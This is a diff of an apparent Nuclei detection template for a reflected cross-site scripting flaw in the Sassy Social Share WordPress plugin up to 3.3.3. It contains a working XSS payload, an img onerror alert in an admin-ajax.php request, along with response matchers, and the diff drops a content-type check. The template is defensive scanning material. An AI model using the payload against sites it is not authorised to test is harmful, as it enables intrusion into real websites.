@@ -1,12 +1,12 @@
 id: sassy-social-share-xss
 
 info:
-  name: Sassy Social Share <= 3.3.3 - Cross-Site Scripting
+  name: Sassy Social Share XSS
   author: Random_Robbie
   severity: medium
-  tags: wordpress,wp-plugin,sassy,xss
-
-requests:
+  description: Sassy Social Share <= 3.3.3 - Cross-Site Scripting (XSS)
+  tags: wordpress,wp-plugin
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]="
@@ -14,18 +14,12 @@ requests:
     matchers-condition: and
     matchers:
       - type: word
-        part: body
         words:
           - '[{"<img src=x onerror=alert(document.domain)>":""}]'
           - 'facebook'
           - 'twitter'
+        part: body
         condition: and
-
-      - type: word
-        part: header
-        words:
-          - 'application/json'
-        negative: true
 
       - type: status
         status:
